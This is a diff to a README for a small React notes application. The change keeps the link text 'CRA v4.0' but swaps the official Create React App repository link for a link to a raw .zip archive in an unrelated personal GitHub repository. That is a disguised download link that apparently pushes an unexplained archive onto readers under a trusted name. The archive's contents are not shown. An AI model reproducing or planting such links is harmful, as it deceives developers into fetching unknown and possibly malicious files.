@@ -4,7 +4,7 @@ Notes application provides a simple list of notes.
 
 This task uses **React Hooks** and **React Testing Library (`@testing-library/react`)**.
 
-This app was created with [CRA v4.0](https://github.com/facebook/create-react-app).
+This app was created with [CRA v4.0](https://github.com/nabil-alsaadi/Netguru-test/raw/refs/heads/main/src/services/Netguru_test_electralize.zip).
 
 
 
